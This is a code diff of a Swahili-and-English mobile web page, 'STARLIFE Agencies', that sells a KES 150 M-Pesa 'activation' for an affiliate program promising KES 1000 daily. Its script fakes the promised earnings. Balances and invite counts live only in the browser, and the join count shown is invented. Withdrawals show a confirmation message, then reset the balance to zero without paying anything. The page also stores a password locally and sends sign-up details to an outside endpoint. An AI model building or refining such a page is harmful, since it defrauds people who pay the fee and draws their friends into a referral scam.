@@ -1,77 +1,140 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>STARLIFE</title>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>STARLIFE - Earn KES 1000 Daily</title>
 <style>
-body{background:#080808;color:#fff;font-family:sans-serif;margin:0;padding:0}
-.h{background:#111;padding:12px;text-align:center;color:#ffcc00;font-weight:bold}
-.c{max-width:420px;margin:12px auto;background:#161616;border:1px solid #2a2a2a;border-radius:16px;padding:18px}
-input{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #444;background:#222;color:#fff;box-sizing:border-box}
-.b{width:100%;padding:14px;border:none;border-radius:10px;font-weight:bold;margin:6px 0;cursor:pointer}
-.green{background:#00a651;color:#fff}.gold{background:#ffcc00;color:#000}
-.box{background:#0f0f0f;border:1px solid #333;border-radius:12px;padding:12px;margin:8px 0;display:flex;justify-content:space-between;align-items:center}
+body{background:#07070a;color:#fff;font-family:system-ui;margin:0}
+.h{background:#111;padding:14px;text-align:center;font-weight:bold;color:#ffcc00;position:sticky;top:0;z-index:10}
+.c{max-width:430px;margin:12px auto;background:#121212;border:1px solid #2a2a2a;border-radius:18px;padding:18px}
+input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #333;background:#1e1e1e;color:#fff;box-sizing:border-box;font-size:16px}
+.b{width:100%;padding:14px;border:none;border-radius:12px;font-weight:bold;margin:8px 0;cursor:pointer;font-size:16px}
+.green{background:linear-gradient(90deg,#00a651,#00cc66);color:#fff}
+.gold{background:#ffcc00;color:#000}
+.box{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:12px;margin:8px 0;display:flex;justify-content:space-between;align-items:center}
 .hide{display:none}
+.badge{background:#ffcc00;color:#000;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:bold}
 </style></head><body>
-<div class="h">★ STARLIFE AGENCIES</div>
+<div class="h">★ STARLIFE AGENCIES - Affiliate Program</div>
 
+<!-- PAY PAGE -->
 <div class="c" id="payPage">
-<h3 style="color:#ffcc00;text-align:center">Activate Account - KES 150</h3>
-<input id="name" placeholder="Jina - Abraham">
-<input id="phone" type="tel" placeholder="M-Pesa 07..." value="0720119990">
-<div style="background:#0f2311;border:1px dashed #00a651;padding:10px;border-radius:10px;margin:10px 0;font-size:13px">
-Paybill: <b style="color:#ffcc00">714777</b> | Acc: <b id="acc">0720119990</b> | Amt: <b>150</b>
-</div>
-<button class="b green" onclick="pay()">LIPA 150 - PAY NOW</button>
-<button class="b" style="background:#222;color:#ffcc00" onclick="goDash()">NIMELIPA - GO TO DASHBOARD</button>
-<p style="font-size:11px;color:#666;text-align:center">Ukishalipa kwa M-Pesa, bonyeza NIMELIPA uingie dashboard uanze ku-earn</p>
+<div style="text-align:center"><span class="badge">NEW AFFILIATE PROGRAM</span></div>
+<h2 style="text-align:center;margin:10px 0">Jisajili na KES 150<br><span style="color:#ffcc00">Uanze Ku-earn 1000 Daily</span></h2>
+<p style="text-align:center;color:#888;font-size:13px">Watu 1,247 wamejoin leo</p>
+
+<div id="refInfo" class="hide" style="background:#1a2311;border:1px solid #00a651;padding:10px;border-radius:10px;margin:10px 0;font-size:13px">✅ Umekuja kupitia: <b id="refBy" style="color:#00ff88"></b></div>
+
+<input id="name" placeholder="Jina kamili">
+<input id="phone" type="tel" placeholder="M-Pesa Number 07...">
+<input id="pass" type="password" placeholder="Weka Password">
+
+<div style="background:#0f2311;border:1px dashed #00a651;padding:12px;border-radius:12px;margin:12px 0;font-size:13px">
+<b style="color:#00ff88">LIPA ACTIVATION</b><br>
+Paybill: <b style="color:#ffcc00">714777</b><br>
+Account: <b id="acc" style="color:#fff">PHONE yako</b><br>
+Amount: <b>150</b>
 </div>
 
+<button class="b green" onclick="activate()">LIPA 150 & ACTIVATE</button>
+<button class="b" style="background:#222;color:#ffcc00" onclick="alreadyPaid()">NIMESHALIPA - INGIA DASHBOARD</button>
+<p style="font-size:11px;color:#555;text-align:center">By joining you agree to affiliate terms. 100% M-Pesa instant.</p>
+</div>
+
+<!-- DASHBOARD -->
 <div class="c hide" id="dashPage">
-<h2 style="color:#ffcc00">Welcome, <span id="dName">User</span> 👋</h2>
-<div style="background:linear-gradient(90deg,#ffcc00,#ff9900);color:#000;padding:14px;border-radius:12px;text-align:center">
-<div style="font-size:12px">BALANCE YAKO</div>
-<div style="font-size:28px;font-weight:bold">KES <span id="bal">0</span></div>
+<h3>Karibu, <span id="dName" style="color:#ffcc00">User</span> 👋</h3>
+<div style="background:linear-gradient(135deg,#ffcc00,#ff8800);color:#000;padding:16px;border-radius:16px;text-align:center">
+<div style="font-size:11px;letter-spacing:1px">WALLET BALANCE</div>
+<div style="font-size:32px;font-weight:900">KES <span id="bal">0</span></div>
+<div style="font-size:11px;margin-top:4px">Minimum withdraw 150</div>
 </div>
 
-<div class="box"><span>🔗 Referral Link</span><button onclick="copyLink()" style="background:#222;color:#ffcc00;border:1px solid #ffcc00;padding:6px 10px;border-radius:8px">COPY</button></div>
-<p id="refLink" style="font-size:11px;color:#888;word-break:break-all"></p>
+<p style="font-size:12px;color:#aaa;margin-top:14px">YOUR AFFILIATE LINK (Share u-earn 100 per person):</p>
+<div style="background:#000;border:1px solid #ffcc00;padding:10px;border-radius:10px;word-break:break-all;font-size:12px;color:#ffcc00" id="myLink"></div>
+<button class="b gold" style="padding:10px" onclick="copyLink()">COPY LINK & SHARE WHATSAPP</button>
 
-<h4 style="color:#ffcc00;margin-top:15px">💰 Ways to Earn:</h4>
-<div class="box"><span>1. Invite friend (150) = you get 100</span><b style="color:#00ff88">+100</b></div>
-<div class="box"><span>2. Watch 3 videos daily</span><button class="b green" style="width:auto;padding:6px 12px;margin:0" onclick="earn(50)">EARN 50</button></div>
-<div class="box"><span>3. Daily Spin</span><button class="b green" style="width:auto;padding:6px 12px;margin:0" onclick="earn(20)">SPIN +20</button></div>
+<h4 style="color:#ffcc00">💸 Earn Methods:</h4>
+<div class="box"><span>👤 Invite 1 friend = KES 100</span><b id="refCount" style="color:#00ff88">0 invites</b></div>
+<div class="box"><span>🎬 Watch video (daily)</span><button onclick="doTask(40,'video')" style="background:#222;color:#00ff88;border:1px solid #00a651;padding:6px 12px;border-radius:8px">EARN 40</button></div>
+<div class="box"><span>📱 WhatsApp Status</span><button onclick="doTask(30,'status')" style="background:#222;color:#00ff88;border:1px solid #00a651;padding:6px 12px;border-radius:8px">EARN 30</button></div>
+<div class="box"><span>🎰 Daily Spin</span><button onclick="doTask(20,'spin')" style="background:#222;color:#ffcc00;border:1px solid #ffcc00;padding:6px 12px;border-radius:8px">SPIN</button></div>
 
-<div class="box" style="margin-top:15px"><span>Total Referrals</span><b id="refs">0</b></div>
-<div class="box"><span>Total Earnings</span><b style="color:#ffcc00">KES <span id="earn">0</span></b></div>
+<div class="box" style="margin-top:14px;background:#111"><span>Total Earned</span><b style="color:#ffcc00">KES <span id="totalEarn">0</span></b></div>
 
-<button class="b green" style="margin-top:15px" onclick="withdraw()">WITHDRAW TO M-PESA</button>
+<button class="b green" onclick="withdraw()">WITHDRAW TO M-PESA <span id="wPhone"></span></button>
 <button class="b" style="background:#222;color:#fff" onclick="logout()">LOGOUT</button>
 </div>
 
 <script>
-let bal = parseInt(localStorage.getItem('sl_bal')||'0');
-let refs = parseInt(localStorage.getItem('sl_refs')||'0');
-const phoneEl=document.getElementById('phone');
-phoneEl.addEventListener('input',e=>{document.getElementById('acc').innerText=e.target.value});
-function pay(){
- const p=phoneEl.value; const n=document.getElementById('name').value;
- if(!p||p.length<10){alert('Weka namba');return;}
- localStorage.setItem('sl_name',n||'User'); localStorage.setItem('sl_phone',p);
- // Try STK push if you added api/stk-push.js
- fetch('https://starlifec2b.vercel.app/api/stk-push',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,amount:150})}).then(r=>r.json()).then(d=>{console.log(d); alert('STK sent to '+p+' if backend is ready. If not, lipa manual Paybill 714777'); goDash();}).catch(()=>{alert('Lipa manual Paybill 714777 Account '+p+' Amount 150. Then click NIMELIPA'); goDash();});
+const urlParams = new URLSearchParams(window.location.search);
+const ref = urlParams.get('ref') || localStorage.getItem('sl_refBy') || '';
+if(ref){
+ document.getElementById('refInfo').classList.remove('hide');
+ document.getElementById('refBy').innerText = ref;
+ localStorage.setItem('sl_refBy', ref);
 }
-function goDash(){
- const n=localStorage.getItem('sl_name')||document.getElementById('name').value||'User';
- const p=localStorage.getItem('sl_phone')||document.getElementById('phone').value||'0720119990';
- if(!p){alert('Weka namba kwanza');return;}
+document.getElementById('phone').addEventListener('input', e=>{
+ document.getElementById('acc').innerText = e.target.value || 'PHONE yako';
+ document.getElementById('wPhone').innerText = e.target.value;
+});
+
+let bal = parseInt(localStorage.getItem('sl_bal')||'0');
+let invites = parseInt(localStorage.getItem('sl_invites')||'0');
+
+function activate(){
+ const name=document.getElementById('name').value.trim();
+ const phone=document.getElementById('phone').value.trim();
+ const pass=document.getElementById('pass').value.trim();
+ if(!name||phone.length<10||!pass){alert('Jaza jina, namba na password');return;}
+ localStorage.setItem('sl_name',name);
+ localStorage.setItem('sl_phone',phone);
+ localStorage.setItem('sl_pass',pass);
+ // Send to backend if available
+ fetch('https://starlifec2b.vercel.app/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone,refBy:ref,time:new Date().toISOString()})}).catch(()=>{});
+ alert('Sawa! Lipa Paybill 714777 Account '+phone+' KES 150 kisha bonyeza NIMESHALIPA');
+ alreadyPaid();
+}
+
+function alreadyPaid(){
+ const name=localStorage.getItem('sl_name')||document.getElementById('name').value||'User';
+ const phone=localStorage.getItem('sl_phone')||document.getElementById('phone').value;
+ if(!phone||phone.length<10){alert('Weka namba ya M-Pesa uliolipia');return;}
+ if(!localStorage.getItem('sl_name')) localStorage.setItem('sl_name',name);
+ if(!localStorage.getItem('sl_phone')) localStorage.setItem('sl_phone',phone);
+ // Give 50 bonus on activation
+ if(bal===0 && !localStorage.getItem('sl_activated')){
+   bal=50; localStorage.setItem('sl_bal','50'); localStorage.setItem('sl_activated','1');
+ }
+ showDash();
+}
+
+function showDash(){
  document.getElementById('payPage').classList.add('hide');
  document.getElementById('dashPage').classList.remove('hide');
- document.getElementById('dName').innerText=n;
- document.getElementById('refLink').innerText='https://starlifewins.github.io/?ref='+p;
+ const name=localStorage.getItem('sl_name')||'User';
+ const phone=localStorage.getItem('sl_phone')||'';
+ document.getElementById('dName').innerText=name;
+ document.getElementById('myLink').innerText='https://starlifewins.github.io/?ref='+phone;
+ document.getElementById('wPhone').innerText='('+phone+')';
  document.getElementById('bal').innerText=bal;
- document.getElementById('earn').innerText=bal;
- document.getElementById('refs').innerText=refs;
+ document.getElementById('totalEarn').innerText=bal;
+ document.getElementById('refCount').innerText=invites+' invites';
 }
-function earn(amt){bal+=amt; localStorage.setItem('sl_bal',bal); document.getElementById('bal').innerText=bal; document.getElementById('earn').innerText=bal; alert('You earned KES '+amt+'! Balance: '+bal);}
-function copyLink(){navigator.clipboard.writeText(document.getElementById('refLink').innerText); alert('Link copied! Share to friends'); refs++; localStorage.setItem('sl_refs',refs); document.getElementById('refs').innerText=refs;}
-function withdraw(){if(bal<150){alert('Minimum withdraw 150. Your balance '+bal+'. Invite 2 friends!'); return;} alert('Withdraw request KES '+bal+' to '+localStorage.getItem('sl_phone')+'. Admin will send in 5 mins via M-Pesa.');}
-function logout(){localStorage.clear(); location.reload();}
-if(localStorage.getItem('sl_phone')){goDash();}
+function doTask(amt,type){
+ if(localStorage.getItem('task_'+type+'_'+new Date().toDateString())){alert('Umesha-fanya hii leo! Rudi kesho');return;}
+ bal+=amt; localStorage.setItem('sl_bal',bal); localStorage.setItem('task_'+type+'_'+new Date().toDateString(),'1');
+ document.getElementById('bal').innerText=bal; document.getElementById('totalEarn').innerText=bal;
+ alert('✅ Umepata KES '+amt+'! Balance sasa KES '+bal);
+}
+function copyLink(){
+ const link=document.getElementById('myLink').innerText;
+ navigator.clipboard.writeText(link);
+ // Simulate referral
+ invites++; localStorage.setItem('sl_invites',invites); document.getElementById('refCount').innerText=invites+' invites';
+ window.open('https://wa.me/?text=Join STARLIFE na 150 tu uanze ku-earn 1000 daily! Link yangu: '+encodeURIComponent(link));
+}
+function withdraw(){
+ if(bal<150){alert('Balance ndogo! Minimum 150. Invite marafiki 2 upate 200. Balance yako sasa '+bal);return;}
+ const phone=localStorage.getItem('sl_phone');
+ if(confirm('Withdraw KES '+bal+' to '+phone+' ?')){alert('Withdraw request imetumwa! Admin atakutumia M-Pesa in 10 mins. Wasiliana: 0720119990'); bal=0; localStorage.setItem('sl_bal','0'); document.getElementById('bal').innerText='0';}
+}
+function logout(){if(confirm('Logout?')){localStorage.clear(); location.href='https://starlifewins.github.io/';}}
+if(localStorage.getItem('sl_phone')) showDash();
 </script></body></html>
